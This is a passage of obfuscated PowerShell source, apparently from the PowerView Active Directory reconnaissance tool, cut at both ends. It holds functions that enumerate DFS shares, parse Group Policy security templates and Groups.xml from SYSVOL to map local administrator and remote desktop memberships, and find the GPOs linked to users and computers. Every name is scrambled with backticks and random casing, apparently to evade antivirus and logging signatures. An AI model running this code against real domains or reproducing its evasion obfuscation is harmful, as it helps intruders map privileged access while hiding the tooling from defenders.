                            ${TARg`ET_`S`TAtE`_`sTa`RT} = ${TaR`GeT_tIm`e_S`Ta`Mp`_e`Nd} + 1
                            ${TARgE`T_`STA`Te`_END} = ${T`ARGet`_sta`Te_`StARt} + 3
                            ${Tar`geT_`st`ATe} = [bitconverter]::ToUInt32(${D`Fs`_t`Ar`gEtlI`sT_BlOb}[${Ta`RgeT`_St`A`TE_stART}..${TARge`T`_stAt`e_`e`ND}],0)

                            ${targEt`_`TYp`e_stARt} = ${taR`G`et`_STAt`E_END} + 1
                            ${ta`R`GET_`TYp`E_enD} = ${TarG`et_`T`y`PE_sTaRt} + 3
                            ${T`Ar`gET`_TYPE} = [bitconverter]::ToUInt32(${Df`S`_T`Arg`ETliST_blOb}[${T`ArgEt_t`yPE_`ST`ARt}..${taRgE`T_TY`p`e_E`Nd}],0)

                            ${SeRv`er_NAme_Si`z`E_Sta`Rt} = ${TarGeT_`T`y`pe_enD} + 1
                            ${sErve`R_NA`m`e_`sIze`_e`Nd} = ${s`eRV`Er`_NaMe`_SiZe_ST`A`RT} + 1
                            ${sErver_`N`AM`e`_`Size} = [bitconverter]::ToUInt16(${df`s`_tArg`Etl`Ist_blob}[${Ser`VE`R`_N`AM`e_sIzE_St`ArT}..${SEr`VE`R_`Na`M`e_SIZE`_enD}],0)

                            ${sER`VE`R_NamE_`s`T`ART} = ${SE`RVEr_`NAME_S`i`Ze`_`eNd} + 1
                            ${ser`VER_N`A`ME_enD} = ${Se`RV`e`R_naME`_s`TaRT} + ${S`ErV`er_n`AME_S`IZE} - 1
                            ${Se`RveR_`Na`ME} = [System.Text.Encoding]::Unicode.GetString(${d`Fs`_TargETLisT_Bl`OB}[${sErvE`R`_NamE_S`Ta`Rt}..${SeR`VeR`_NAm`e_EnD}])

                            ${S`hArE_NAM`E_S`i`Ze_St`Art} = ${SE`RveR_`NA`ME_E`Nd} + 1
                            ${sHaR`E`_N`AME`_s`ize_e`ND} = ${S`hARE`_na`m`E_s`iZE`_StArT} + 1
                            ${ShaRE`_nA`Me_si`ze} = [bitconverter]::ToUInt16(${df`S_T`ARgEt`LISt`_b`loB}[${s`hARE_nam`E`_`Si`zE_sTart}..${s`HAR`e_na`me_SIze_enD}],0)
                            ${Sh`A`Re_`NAme_S`Ta`RT} = ${Share`_`N`AME_SI`z`E_e`Nd} + 1
                            ${SH`ARE`_`Na`mE_eNd} = ${SHA`R`E_NaM`e`_sT`ART} + ${sh`A`RE_nAMe`_Size} - 1
                            ${Sh`Ar`E_name} = [System.Text.Encoding]::Unicode.GetString(${d`FS_tarGE`TLIsT`_bloB}[${s`hAre`_N`AMe`_STA`RT}..${SH`Ar`E_`N`Ame_ENd}])

                            ${T`ArG`Et_li`sT} += "\\$server_name\$share_name"
                            ${t_oF`Fs`eT} = ${shA`R`E`_Name_ENd} + 1
                        }
                    }
                }
                ${o`FfsET} = ${b`loB`_dA`Ta_`End} + 1
                ${Dfs`_pkt`_pR`opertIEs} = @{
                    'Name' = ${b`lob`_namE}
                    'Prefix' = ${p`REFIX}
                    'TargetList' = ${Tar`gEt`_`liSt}
                }
                ${OB`j`E`CT_lisT} += new-o`BJ`ECt -TypeName PS`Ob`Ject -Property ${dFS_pKt_P`ROpe`Rt`I`eS}
                ${Pre`F`IX} = ${nU`Ll}
                ${BlO`B_nA`me} = ${nu`lL}
                ${tarGe`T_`L`ist} = ${n`ULL}
            }

            ${S`E`RvErs} = @()
            ${O`B`j`ecT_lIsT} | f`orEACh-OB`jEcT {
                if (${_}.TargetList) {
                    ${_}.TargetList | FOrE`Ac`h-o`BjECt {
                        ${sE`Rv`ErS} += ${_}.split('\')[2]
                    }
                }
            }

            ${SE`RV`erS}
        }

        function G`et-doM`AinDFssH`ARev1 {
            [CmdletBinding()]
            Param(
                [String]
                ${d`OmaIN},

                [String]
                ${S`eA`R`CHbase},

                [String]
                ${s`eR`VEr},

                [String]
                ${SeARC`h`S`CopE} = 'Subtree',

                [Int]
                ${rESU`LTPaGE`s`IZe} = 200,

                [Int]
                ${S`e`RvErt`ime`LiMIT},

                [Switch]
                ${t`OM`BS`TOne},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${c`REDE`NTIAl} = [Management.Automation.PSCredential]::Empty
            )

            ${Dfs`S`EAr`chER} = GE`T`-DomAi`NS`eA`RChEr @PSBoundParameters

            if (${dfSSE`A`R`ChEr}) {
                ${d`Fss`Hares} = @()
                ${dFs`Se`ArCh`eR}.filter = '(&(objectClass=fTDfs))'

                try {
                    ${r`esUltS} = ${Df`S`S`EArCher}.FindAll()
                    ${reS`Ults} | W`he`RE-ObJ`ect {${_}} | fOrE`ACh`-OBJe`cT {
                        ${P`RopE`RT`iEs} = ${_}.Properties
                        ${remOTenA`m`ES} = ${p`RO`pert`iES}.remoteservername
                        ${p`Kt} = ${PRo`perT`iEs}.pkt

                        ${Dfs`sh`AR`Es} += ${rE`MoTE`NAm`es} | FOr`EAcH`-`ObjE`CT {
                            try {
                                if ( ${_}.Contains('\') ) {
                                    nE`W`-ob`jECT -TypeName psoBj`E`cT -Property @{'Name'=${P`R`oPErTiES}.name[0];'RemoteServerName'=${_}.split('\')[2]}
                                }
                            }
                            catch {
                                w`RIte`-VER`Bo`SE "[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : $_"
                            }
                        }
                    }
                    if (${re`sULTs}) {
                        try { ${r`Esu`lts}.dispose() }
                        catch {
                            Wri`Te-VEr`BoSE "[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: $_"
                        }
                    }
                    ${df`s`sea`RChER}.dispose()

                    if (${p`KT} -and ${p`KT}[0]) {
                        p`ArsE-`PkT ${P`KT}[0] | FOrea`ch-Obj`e`Ct {
                            
                            
                            
                            if (${_} -ne 'null') {
                                NeW`-oB`jEct -TypeName psO`B`JEcT -Property @{'Name'=${PRoP`e`Rt`Ies}.name[0];'RemoteServerName'=${_}}
                            }
                        }
                    }
                }
                catch {
                    write-w`A`RN`iNg "[Get-DomainDFSShare] Get-DomainDFSShareV1 error : $_"
                }
                ${D`FssH`ARes} | sorT`-`ObJEcT -Unique -Property 'RemoteServerName'
            }
        }

        function geT-`d`OmAiNDF`S`sha`RE`V2 {
            [CmdletBinding()]
            Param(
                [String]
                ${DoMA`IN},

                [String]
                ${SE`A`RcH`BASe},

                [String]
                ${s`E`RVEr},

                [String]
                ${sEAR`c`hS`cOpe} = 'Subtree',

                [Int]
                ${rEsU`lt`p`AgESIze} = 200,

                [Int]
                ${Ser`V`ertiM`eLiM`It},

                [Switch]
                ${tOM`Bs`To`Ne},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${CReDe`NT`IAL} = [Management.Automation.PSCredential]::Empty
            )

            ${DF`sSEAr`cH`eR} = GEt-DOma`iNsE`ARC`HeR @PSBoundParameters

            if (${d`FS`sEAr`cHEr}) {
                ${DFSs`hAR`es} = @()
                ${DfsS`E`Arc`Her}.filter = '(&(objectClass=msDFS-Linkv2))'
                ${nU`ll} = ${dfSs`earCh`er}.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

                try {
                    ${rEsu`lts} = ${Df`SSeARCH`Er}.FindAll()
                    ${R`eSulTS} | W`he`Re`-oBJeCt {${_}} | F`OreAc`H-Obj`ECT {
                        ${pro`PErti`Es} = ${_}.Properties
                        ${targE`T`_`lisT} = ${pr`O`PERt`IES}.'msdfs-targetlistv2'[0]
                        ${x`mL} = [xml][System.Text.Encoding]::Unicode.GetString(${tar`GEt`_li`st}[2..(${tA`Rg`Et_lIsT}.Length-1)])
                        ${d`FS`SHAreS} += ${X`mL}.targets.ChildNodes | fOREaCH`-O`Bj`eCT {
                            try {
                                ${t`ArGET} = ${_}.InnerText
                                if ( ${Ta`R`GeT}.Contains('\') ) {
                                    ${dFS`R`ooT} = ${t`ArGET}.split('\')[3]
                                    ${S`hAr`En`AMe} = ${p`ROpEr`TIES}.'msdfs-linkpathv2'[0]
                                    New`-`oBjEcT -TypeName pSoB`J`ECT -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=${tArg`ET}.split('\')[2]}
                                }
                            }
                            catch {
                                WRiT`e-`V`eRboSe "[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : $_"
                            }
                        }
                    }
                    if (${rESu`L`Ts}) {
                        try { ${Re`sULTS}.dispose() }
                        catch {
                            WriT`e`-VerB`O`sE "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                        }
                    }
                    ${dFS`S`eArChER}.dispose()
                }
                catch {
                    wRi`TE-WA`R`N`Ing "[Get-DomainDFSShare] Get-DomainDFSShareV2 error : $_"
                }
                ${d`F`s`sHArEs} | SorT`-obJE`ct -Unique -Property 'RemoteServerName'
            }
        }
    }

    PROCESS {
        ${Df`SsH`ARes} = @()

        if (${pSBo`UnD`p`AraMe`T`eRs}['Domain']) {
            ForEach (${targe`TDOM`A`iN} in ${dom`Ain}) {
                ${S`Ea`Rc`HERA`RguMEn`TS}['Domain'] = ${ta`RGeTdo`MaiN}
                if (${V`e`RsIoN} -match 'all|1') {
                    ${d`FsSH`ArEs} += gEt-D`o`MAiNDf`sS`hAReV1 @SearcherArguments
                }
                if (${v`Er`SiOn} -match 'all|2') {
                    ${dFSs`H`AR`eS} += geT-DOmAI`Nd`FS`shaRE`V2 @SearcherArguments
                }
            }
        }
        else {
            if (${V`ErsI`On} -match 'all|1') {
                ${DFSs`HA`RES} += geT-DoM`Ai`NdfSSH`A`R`Ev1 @SearcherArguments
            }
            if (${Ver`Si`ON} -match 'all|2') {
                ${dF`ss`HaR`es} += GET`-dOMA`I`NDFs`shAREV2 @SearcherArguments
            }
        }

        ${d`FS`Sh`ArES} | Sort-`o`BjE`ct -Property ('RemoteServerName','Name') -Unique
    }
}








function ge`T-gP`TTMpl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = ${tR`Ue}, ValueFromPipeline = ${T`RUE}, ValueFromPipelineByPropertyName = ${T`RuE})]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        ${g`Ptt`mplPaTH},

        [Switch]
        ${out`P`UTOBje`CT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`DENTI`Al} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${mA`PPE`D`paTHS} = @{}
    }

    PROCESS {
        try {
            if ((${gp`Tt`MpL`PATh} -Match '\\\\.*\\.*') -and (${p`Sb`oUN`DPARaMeteRS}['Credential'])) {
                ${s`y`Svo`lPaTH} = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL"
                if (-not ${mapp`e`dPat`Hs}[${sYSVOl`p`ATH}]) {
                    
                    A`D`D-`Remo`TECONnectION -Path ${SysVoL`PA`TH} -Credential ${Cr`E`D`ENTiAL}
                    ${ma`Pp`ED`paTHS}[${SYS`V`OLP`AtH}] = ${t`RUE}
                }
            }

            ${tAR`Get`Gpt`T`mPLpAth} = ${gpt`Tm`plpaTH}
            if (-not ${T`ARG`Et`G`ptTm`plpatH}.EndsWith('.inf')) {
                ${TA`RG`Et`GpttmpLP`AtH} += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }

            WritE-v`ER`BOSe "[Get-GptTmpl] Parsing GptTmplPath: $TargetGptTmplPath"

            if (${P`sbo`UN`DpaRaMe`TErs}['OutputObject']) {
                ${CO`NTeNTs} = Ge`T-I`NIc`ONTENt -Path ${t`Argetg`P`TTmp`LPaTh} -OutputObject -ErrorAction sT`oP
                if (${c`O`NtEnts}) {
                    ${COn`TEN`Ts} | a`dD-`MembeR nO`Te`P`RopERTy 'Path' ${TA`RGe`T`Gpt`TmPlPatH}
                    ${cOn`T`E`NtS}
                }
            }
            else {
                ${CoNt`e`Nts} = g`et-INI`ConTENt -Path ${TarG`Et`gp`TTmp`LpAth} -ErrorAction sT`OP
                if (${C`onTen`TS}) {
                    ${CONTE`N`Ts}['Path'] = ${t`ARg`Etgpt`TMp`LpAth}
                    ${co`NtenTs}
                }
            }
        }
        catch {
            wRIT`e`-verbOse "[Get-GptTmpl] Error parsing $TargetGptTmplPath : $_"
        }
    }

    END {
        
        ${MaP`Pe`dpAthS}.Keys | For`E`Ach-obj`e`ct { REmO`Ve-RE`moTeC`ONnECT`ION -Path ${_} }
    }
}


function Ge`T-gROupSx`ML {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = ${tr`UE}, ValueFromPipeline = ${tR`Ue}, ValueFromPipelineByPropertyName = ${T`RuE})]
        [Alias('Path')]
        [String]
        ${Gr`o`U`PsxmLpaTH},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`den`Tial} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${mA`pp`edpa`ThS} = @{}
    }

    PROCESS {
        try {
            if ((${gRO`UPsXMLP`A`TH} -Match '\\\\.*\\.*') -and (${pSbo`U`NdPAram`eters}['Credential'])) {
                ${sYSvO`Lp`A`TH} = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                if (-not ${mAp`p`EdpatHS}[${sySV`Ol`P`ATh}]) {
                    
                    AD`D-r`EmO`TECON`Nec`TION -Path ${SYSvO`LpA`Th} -Credential ${cR`edeN`TIAl}
                    ${map`peDPaT`HS}[${SysVOL`p`A`TH}] = ${t`RUE}
                }
            }

            [XML]${grO`UPsXmlCO`Nt`ENt} = gEt-`co`N`TenT -Path ${gR`oUpsxMlP`ATh} -ErrorAction s`Top

            
            ${gR`OupSXM`Lcon`TEnT} | SEL`ECt-`xmL "/Groups/Group" | seL`ect-`OBJect -ExpandProperty NO`De | fOrE`A`ch-oBjeCT {

                ${gRo`UP`NA`mE} = ${_}.Properties.groupName

                
                ${gR`OUP`Sid} = ${_}.Properties.groupSid
                if (-not ${GRou`P`siD}) {
                    if (${gRO`U`PN`AME} -match 'Administrators') {
                        ${G`Ro`Up`SID} = 'S-1-5-32-544'
                    }
                    elseif (${g`Rou`PNaMe} -match 'Remote Desktop') {
                        ${GrO`U`PSId} = 'S-1-5-32-555'
                    }
                    elseif (${G`RO`UP`NAME} -match 'Guests') {
                        ${Gr`OupSId} = 'S-1-5-32-546'
                    }
                    else {
                        if (${PsboU`NDpArAMET`e`RS}['Credential']) {
                            ${grO`Up`sId} = convE`R`TT`o`-sid -ObjectName ${GroU`P`NA`Me} -Credential ${c`ReD`eNTI`AL}
                        }
                        else {
                            ${GROU`Ps`iD} = CONVE`RT`TO-`siD -ObjectName ${G`RoUpn`AmE}
                        }
                    }
                }

                
                ${MEM`BErS} = ${_}.Properties.members | SeLECT`-oB`jECT -ExpandProperty m`emBEr | WHe`Re-o`B`JEct { ${_}.action -match 'ADD' } | fo`Re`AcH-`obJ`EcT {
                    if (${_}.sid) { ${_}.sid }
                    else { ${_}.name }
                }

                if (${me`MB`Ers}) {
                    
                    if (${_}.filters) {
                        ${fI`Lt`ErS} = ${_}.filters.GetEnumerator() | Fo`R`EAch-oB`je`Ct {
                            Ne`W`-ob`jECt -TypeName pSOBj`e`ct -Property @{'Type' = ${_}.LocalName;'Value' = ${_}.name}
                        }
                    }
                    else {
                        ${f`iLT`ErS} = ${Nu`lL}
                    }

                    if (${m`e`mbERs} -isnot [System.Array]) { ${m`eMBe`RS} = @(${M`EM`BeRs}) }

                    ${G`RoUpS`xML} = n`ew-O`BJeCT p`S`obJEct
                    ${Gr`OUP`S`xML} | A`dd`-MeMbEr noTEPro`pE`Rty 'GPOPath' ${tArg`E`Tgro`UP`SXMlPath}
                    ${g`R`OuPSxml} | ADD-mE`mB`Er n`oTEPro`p`erty 'Filters' ${F`Il`TeRs}
                    ${gRO`Ups`XML} | Add-mem`B`er nO`Tep`RoPeR`Ty 'GroupName' ${GROUPn`A`Me}
                    ${gR`oups`xML} | ADd-`M`EMBEr nO`TE`pr`OPeRty 'GroupSID' ${G`RO`UpSID}
                    ${grOuPs`x`ML} | aDD`-ME`mB`er NO`TEPRO`Pe`RTy 'GroupMemberOf' ${nU`ll}
                    ${G`ROUp`sXML} | A`DD-meMb`ER NoTEpRo`PE`RTY 'GroupMembers' ${Mem`Be`Rs}
                    ${Gro`UpSX`mL}.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    ${Gro`U`psxmL}
                }
            }
        }
        catch {
            wR`i`Te-Ve`RbO`sE "[Get-GroupsXML] Error parsing $TargetGroupsXMLPath : $_"
        }
    }

    END {
        
        ${M`Appe`dpaths}.Keys | F`oR`EaCh-OB`JEcT { R`E`MOve-R`E`Mo`TECOnNECtiOn -Path ${_} }
    }
}


function gE`T`-DomAiNGpo {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RuE}, ValueFromPipelineByPropertyName = ${tr`Ue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${I`Den`T`iTy},

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${co`mP`UTeri`D`eNtI`Ty},

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${UsEr`iDENT`I`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMAIn},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`d`APf`iLTEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PrO`p`eRtI`eS},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${Se`A`Rc`Hbase},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sE`Rv`er},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sea`Rc`HSC`OPE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsUl`TpA`GESiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Ser`VE`RtimELI`MIT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${SE`cuRi`TYmAs`kS},

        [Switch]
        ${tO`mBS`TonE},

        [Alias('ReturnOne')]
        [Switch]
        ${f`iNd`ONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Red`enTiAl} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`AW},

        [Switch]
        ${S`Sl},

        [Switch]
        ${O`B`FuScaTe}
    )

    BEGIN {
        ${s`E`ArCH`eraR`guMenTS} = @{}
        if (${Psb`Ou`NdP`AraMete`RS}['Domain']) { ${SEa`R`c`hERArGUmEntS}['Domain'] = ${doMa`iN} }
        if (${PS`B`OUndP`Ar`AMeTeRs}['Properties']) { ${seARc`h`eR`ArG`Um`enTS}['Properties'] = ${PRO`PE`R`TiES} }
        if (${pS`BOUN`d`PArA`METers}['SearchBase']) { ${SEa`Rc`HER`AR`Gu`meNTs}['SearchBase'] = ${S`eARcH`BasE} }
        if (${PSb`OuNDpar`AMe`TERs}['Server']) { ${se`ARCHerarGum`EN`TS}['Server'] = ${S`erVeR} }
        if (${psB`ounDPA`RAME`TERS}['SearchScope']) { ${seARCH`eRar`g`Ume`Nts}['SearchScope'] = ${sea`RcHsc`ope} }
        if (${PSboUndp`Ar`AmeTE`Rs}['ResultPageSize']) { ${SE`ArcHERARG`Umen`Ts}['ResultPageSize'] = ${RESUL`TP`A`GesIze} }
        if (${PsBoun`dPAR`A`meTe`RS}['ServerTimeLimit']) { ${S`Ea`RcHErArGUme`NTS}['ServerTimeLimit'] = ${sERvER`TIM`el`ImiT} }
        if (${PsB`oundP`AR`AmetERs}['SecurityMasks']) { ${SEaRCH`ERaR`gumEN`Ts}['SecurityMasks'] = ${se`CuRI`TyMA`SKs} }
        if (${P`S`BoUnd`parAMet`eRS}['Tombstone']) { ${S`eArC`HE`RargU`me`NtS}['Tombstone'] = ${tO`M`BSTo`NE} }
        if (${pSBoun`d`P`ArAMet`e`RS}['Credential']) { ${SEAR`ChERarGu`mE`Nts}['Credential'] = ${CrEDe`NTI`Al} }
        if (${Ps`BouNDp`ArAM`e`TErs}['SSL']) { ${s`EARCHe`RaRgu`mEN`Ts}['SSL'] = ${s`sL} }
        if (${psBo`U`NDPa`RAm`e`TErS}['Obfuscate']) {${Se`ARCH`E`RArG`U`MEnts}['Obfuscate'] = ${OBFuSc`A`Te} }
    }

    PROCESS {
        if (${P`SBOuN`dpaR`A`ME`TerS}['ComputerIdentity'] -or ${pSbOUn`dPAr`Am`E`T`eRs}['UserIdentity']) {
            ${G`poaD`SpA`THs} = @()
            if (${sEa`R`cher`ArGUM`e`NtS}['Properties']) {
                ${O`l`d`proPErT`IEs} = ${SeA`RCH`eRA`RGUMENTS}['Properties']
            }
            ${SeArC`hE`Ra`R`guMENTS}['Properties'] = 'distinguishedname,dnshostname'
            ${tAr`gETcomP`Ut`ER`NA`Me} = ${Nu`ll}

            if (${psBoUndpARA`ME`T`ers}['ComputerIdentity']) {
                ${SeArCh`ERaRgU`MEn`Ts}['Identity'] = ${Co`mpU`TeRide`N`Ti`Ty}
                ${CO`m`p`UtER} = get-DoMAI`N`CoMPUt`er @SearcherArguments -FindOne | S`eLe`Ct-`OBJEct -First 1
                if(-not ${cOmp`Ut`ER}) {
                    wRi`Te-VErbO`sE "[Get-DomainGPO] Computer '$ComputerIdentity' not found!"
                }
                ${obJ`ECT`Dn} = ${CO`MP`UtER}.distinguishedname
                ${T`ArgetcoM`pUte`RNaMe} = ${c`omPu`TeR}.dnshostname
            }
            else {
                ${SE`AR`chEr`Ar`gUMEntS}['Identity'] = ${u`SERiDENti`TY}
                ${uS`eR} = gET-Dom`AiNu`S`er @SearcherArguments -FindOne | Se`lEcT`-oBjECT -First 1
                if(-not ${U`sEr}) {
                    wRIte-VE`RB`osE "[Get-DomainGPO] User '$UserIdentity' not found!"
                }
                ${ObJeC`T`Dn} = ${uS`ER}.distinguishedname
            }

            
            ${o`BJEcto`US} = @()
            ${oB`JEc`TOUs} += ${oBj`ec`TDN}.split(',') | fo`RE`Ach-ObJ`ecT {
                if(${_}.startswith('OU=')) {
                    ${O`B`j`EctdN}.SubString(${OB`j`ECTdN}.IndexOf("$($_),"))
                }
            }
            wRITe-V`ErB`Ose "[Get-DomainGPO] object OUs: $ObjectOUs"

            if (${OB`Je`cTOuS}) {
                
                ${S`eA`RCHeRa`R`G`UMENTs}.Remove('Properties')
                ${inH`ERIt`A`NCED`iS`A`BLed} = ${f`Alse}
                ForEach(${Ob`j`ECToU} in ${OB`jEC`TOUs}) {
                    ${se`ArChe`RARgUM`EnTs}['Identity'] = ${Obje`c`Tou}
                    ${GP`oAd`sPAths} += G`ET-d`o`Mainou @SearcherArguments | f`OR`eacH-OBject {
                        
                        if (${_}.gplink) {
                            ${_}.gplink.split('][') | f`OREA`ch-`ObjeCT {
                                if (${_}.startswith('LDAP')) {
                                    ${PA`Rts} = ${_}.split(';')
                                    ${Gpo`dn} = ${P`Ar`TS}[0]
                                    ${EnFo`RC`Ed} = ${p`A`Rts}[1]
                                 if (${i`NhERIta`Ncedi`SA`BLed}) {
                                        
                                        
                                        if (${e`Nfo`RcED} -eq 2) {
                                            ${g`podN}
                                        }
                                    }
                                    else {
                                        
                                        ${g`PODN}
                                    }
                                }
                            }
                        }

                        
                        if (${_}.gpoptions -eq 1) {
                            ${I`NHe`RIT`A`NCEd`ISaB`LeD} = ${t`Rue}
                        }
                    }
                }
            }

            if (${T`Arg`EtCompu`TERN`AME}) {
                
                ${cO`mp`UTeRSITE} = (GEt-nETc`Omp`U`Te`RSIT`e`Name -ComputerName ${t`A`RGE`TCOMPU`TERN`Ame}).SiteName
                if(${CoM`p`UtE`Rs`ITe} -and (${COMpUTE`R`site} -notlike 'Error*')) {
                    ${SeARc`HE`RAr`g`UMEN`Ts}['Identity'] = ${co`MPuTe`Rs`ite}
                    ${gPOaD`sPaT`hS} += Ge`T-Doma`In`site @SearcherArguments | F`O`REAC`H-OBJeCt {
                        if(${_}.gplink) {
                            
                            ${_}.gplink.split('][') | F`OrE`Ach`-oBJE`Ct {
                                if (${_}.startswith('LDAP')) {
                                    ${_}.split(';')[0]
                                }
                            }
                        }
                    }
                }
            }

            
            ${O`B`JeCtdo`mAin`Dn} = ${ObJe`c`TDN}.SubString(${ObJ`EC`TdN}.IndexOf('DC='))
            ${SEarc`hERAr`G`UMEnTs}.Remove('Identity')
            ${SEa`RchEraR`guME`N`TS}.Remove('Properties')
            ${Sear`C`her`ArG`U`menTS}['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
            ${GPO`AdSp`A`Ths} += GeT-do`MaInObJ`E`ct @SearcherArguments | FO`ReA`CH-OBJ`e`Ct {
                if(${_}.gplink) {
                    
                    ${_}.gplink.split('][') | forEA`C`h-Obje`CT {
                        if (${_}.startswith('LDAP')) {
                            ${_}.split(';')[0]
                        }
                    }
                }
            }
            wr`i`TE-VERbO`SE "[Get-DomainGPO] GPOAdsPaths: $GPOAdsPaths"

            
            if (${O`LDPr`OP`E`RTIes}) { ${sEA`RcHE`R`AR`gUMe`NtS}['Properties'] = ${Old`pRo`pErtIes} }
            else { ${SeaR`c`H`ERA`R`guMeNTs}.Remove('Properties') }
            ${s`eaRCH`e`Rar`GumEnTs}.Remove('Identity')

            ${gPoA`d`sPA`THS} | w`HeRE`-obje`ct {${_} -and (${_} -ne '')} | fOreAcH-`obJ`eCT {
                
                ${se`A`R`ch`eRarGuMen`TS}['SearchBase'] = ${_}
                ${searcH`E`RAr`gUM`e`Nts}['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                gEt-do`mA`I`Nobje`Ct @SearcherArguments | FORE`AcH`-Ob`JEcT {
                    if (${p`sbo`U`NdpaRAmEteRS}['Raw']) {
                        ${_}.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        ${_}.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    ${_}
                }
            }
        }
        else {
            ${I`dENtity`F`i`lTeR} = ''
            ${fiL`T`er} = ''
            ${IDEnT`I`Ty} | wh`ERe`-Obje`cT {${_}} | FOr`Each`-O`Bje`ct {
                ${i`DenTI`TyI`N`stanCe} = ${_}.Replace('(', '\28').Replace(')', '\29')
                if (${IdEntIT`Y`In`STA`N`cE} -match 'LDAP://|^CN=.*') {
                    ${I`dEN`T`iTYfil`Ter} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${psbounDP`A`RAm`e`TErs}['Domain']) -and (-not ${PsBOUN`DpA`RaMe`TeRS}['SearchBase'])) {
                        
                        
                        ${iDenT`ITy`DOMAin} = ${iDe`NTI`TyInS`T`Ance}.SubString(${id`EntiT`yins`TaN`cE}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        w`Rit`E-VERb`Ose "[Get-DomainGPO] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        ${SEA`Rc`Her`AR`GUmeNtS}['Domain'] = ${IDE`N`T`ITYdOmaIN}
                        ${GPosE`Arc`heR} = GET-DomA`i`NsEA`R`chEr @SearcherArguments
                        if (-not ${GPo`se`ARcH`ER}) {
                            wrITe`-Wa`RninG "[Get-DomainGPO] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif (${idEnT`iTYi`NStA`Nce} -match '{.*}') {
                    ${Id`EnT`itY`FilTER} += "(name=$IdentityInstance)"
                }
                else {
                    try {
                        ${g`UIDbYTe`STrinG} = (-Join (([Guid]${IdEnt`I`TY`InSTaNce}).ToByteArray() | FoR`EACH-O`BJ`ect {${_}.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        ${Id`E`NtItYFILt`er} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${Ide`N`Ti`TYfILTEr} += "(displayname=$IdentityInstance)"
                    }
                }
            }
            if (${idENTit`Y`FIl`TeR} -and (${ID`eNTityF`I`lter}.Trim() -ne '') ) {
                ${fi`LTEr} += "(|$IdentityFilter)"
            }

            if (${psb`ou`NDParam`etE`RS}['LDAPFilter']) {
                wRITE-ve`RBO`sE "[Get-DomainGPO] Using additional LDAP filter: $LDAPFilter"
                ${fIlT`eR} += "$LDAPFilter"
            }

            ${F`ilt`Er} = "(&(objectCategory=groupPolicyContainer)$Filter)"
            WRIt`e-V`erBOSe "[Get-DomainGPO] filter string: $($Filter)"

            ${REsu`l`Ts} = INvO`Ke-lda`PQUErY @SearcherArguments -LDAPFilter "$Filter"
            ${Re`S`UltS} | W`hEre-`oB`JEct {${_}} | forEach-O`Bj`Ect {
                if (${P`Sbo`UnDP`ARAmETE`Rs}['Raw']) {
                    
                    ${g`pO} = ${_}
                    ${G`po}.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                }
                else {
                    if (Ge`T-meMb`ER -inputobject ${_} -name "Attributes" -Membertype pRo`Pe`R`TiES) {
                        ${p`ROp} = @{}
                        foreach (${A} in ${_}.Attributes.Keys | so`RT-`ObjeCT) {
